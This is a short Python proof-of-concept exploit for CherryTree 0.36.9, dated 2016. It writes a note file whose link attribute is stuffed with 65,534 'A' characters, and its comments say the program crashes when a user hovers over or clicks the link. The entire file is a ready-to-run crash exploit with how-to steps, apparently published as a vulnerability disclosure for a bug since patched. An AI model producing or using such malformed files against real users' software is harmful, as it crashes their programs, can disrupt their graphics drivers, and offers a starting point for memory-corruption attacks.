#!/usr/bin/python

### CherryTree 0.36.9 - Memory Corruption PoC by n30m1nd ### 

# Date: 2016-10-27
# PoC Author: n30m1nd
# Vendor Homepage: http://www.giuspen.com/cherrytree/
# Software Link: http://www.giuspen.com/software/cherrytree_0.36.9_setup.exe
# Version: Affects all versions of CherryTree prior to 0.37.6
# Tested on: Win7 64bit and Win10 64 bit

# Credits
# =======
# Thanks to Giusepe Penone for this invaluable piece of free, open source software and also for quickly patching this vuln.
# Shouts to the crew at Offensive Security for their huge efforts on making	the infosec community better

# How to
# ======
# * Run this python script. It will generate a "PoC-1.ctd" file.
# * Open the file and hover over the link.
# Bonus
# =====
# It will also crash if you click on the link (but it will also make your graphic drivers stop working sometimes...)

# Why?
# ====
# For what we have seen debugging the crash (thanks R0c0!), it happens inside libcairo2.0.dll due to a null pointer reference when
# trying to draw the contents of the graphical bitmaps.

# Exploit code
# ============

crashfile = '''<?xml version="1.0" ?>
<cherrytree>
    <node custom_icon_id="0" foreground="" is_bold="False" name="PoC" prog_lang="custom-colors" readonly="False" tags="" unique_id="1">
        <rich_text link="node 1 '''+ "A"*65534 + '''">MOUSE OVER THIS</rich_text>
    </node>
</cherrytree>
'''

with open("PoC-1.ctd", 'w') as f:
    f.write(crashfile)
    f.close()